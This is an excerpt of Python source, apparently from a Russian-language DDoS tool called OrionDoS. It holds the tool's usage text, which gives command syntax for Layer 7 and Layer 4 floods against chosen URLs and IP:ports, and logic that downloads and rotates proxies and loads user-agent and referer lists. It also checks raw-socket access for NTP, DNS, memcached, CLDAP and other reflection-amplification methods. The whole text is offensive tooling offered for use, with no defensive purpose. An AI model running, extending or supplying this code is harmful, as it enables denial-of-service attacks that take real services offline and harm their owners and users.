...
class ToolsConsole:
    ...
    def usage():
        print((
                  ...
                  ''
                  ''
                  '* OrionDoS - Скрипт DDoS-атаки с %d Методами\n'
                  'Заметка: Если список прокси пуст, атака будет проходить без прокси\n'
                   ' Если файл прокси не существует, скрипт скачает прокси и проверит их.\n'
                   ' Тип прокси 0 = Все в config.json\n'
                   ''
                   ''
                  '      SocksTypes:\n'
                  '         - 6 = RANDOM\n'
                  ...
                  '\n'
                  'Пример:\n'
                  '   L7 Атака (по домену): python3 %s <метод> <url> <socks_type> <кол-во потоков> <proxylist> <rpc> <время> <debug=optional>\n'
                  '   L4 Атака (по IP): python3 %s <метод> <ip:port> <кол-во потоков> <время>\n'
                  '   L4 С использованием Proxy: python3 %s <метод> <ip:port> <кол-во потоков> <время> <socks_type> <proxylist>\n'
                  '   L4 Усиленный: python3 %s <метод> <ip:port> <кол-во потоков> <время> <файл отражателя (используйте только с'
                   ' Усилением)>\n') %
...
def handleProxyList(con, proxy_li, proxy_ty, url=None):
    if proxy_ty not in {4, 5, 1, 0, 6}:
        exit("Socks Type Не Найден [4, 5, 1, 0, 6]")
    if proxy_ty == 6:
        proxy_ty = randchoice([4, 5, 1])
    if not proxy_li.exists():
        logger.warning(
            f"{bcolors.WARNING}Файл не существует, создание файлов и загрузка прокси.{bcolors.RESET}")
        proxy_li.parent.mkdir(parents=True, exist_ok=True)
        with proxy_li.open("w") as wr:
            Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
            logger.info(
                f"{bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING} Проверяются прокси, это может занять некоторое время{bcolors.RESET}!"
            )
            ...
            if not Proxies:
                exit(
                    "Проверка прокси не удалась, проблема может быть в вашей сети"
                    " | Цель может быть недоступна."
                )
            stringBuilder = ""
    ...
    if proxies:
        logger.info(f"{bcolors.WARNING}Количество прокси: {bcolors.OKBLUE}{len(proxies):,}{bcolors.RESET}")
    else:
        logger.info(
            f"{bcolors.WARNING}Пустой прокси-файл, запущен флуд без прокси{bcolors.RESET}")
        proxies = None
        ...
        with suppress(IndexError):
            ...
            if method in Methods.LAYER7_METHODS:
                ...
                if method != "TOR":
                    try:
                        ...
                        exit('Неверное имя хоста ', url.host, str(e))
                ...
                if method == "BOMB":
                    assert (
                        ...
                        "Установить бомбардир: "
                        "https://github.com/KILLMILKER/OrionDoS/wiki/%D0%9C%D0%B5%D1%82%D0%BE%D0%B4-BOMB"
                    )
                ...
                if not useragent_li.exists():
                    exit("Файл Useragent не существует ")
                if not referers_li.exists():
                    exit("Файл Referer не существует ")
                ...
                if not uagents: exit("Пустой файл агента пользователя ")
                if not referers: exit("Пустой реферальный файл ")

                if threads > 1000:
                    logger.warning("Кол-во потоков выше 1000")
                if rpc > 100:
                    logger.warning(
                        "RPC (запрос на предварительное подключение) выше 100")
            ...
            if method in Methods.LAYER4_METHODS:
                ...
                try:
                    ...
                    exit('Неверное имя хоста', url.host, e)

                if port > 65535 or port < 1:
                    exit("Неверный Порт [Min: 1 / Max: 65535] ")

                if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD", "SYN", "ICMP"} and \
                        not ToolsConsole.checkRawSocket():
                    exit("Невозможно создать необработанный сокет")

                if method in Methods.LAYER4_AMP:
                    logger.warning("для этого метода нужны отдельный VDS серверa, пожалуйста, проверьте")
                    logger.warning("https://github.com/KILLMILKER/OrionDoS/wiki/%D0%A3%D1%81%D0%B8%D0%BB%D0%B5%D0%BD%D0%B8%D0%B5-ddos-%D0%B0%D1%82%D0%B0%D0%BA%D0%B8")
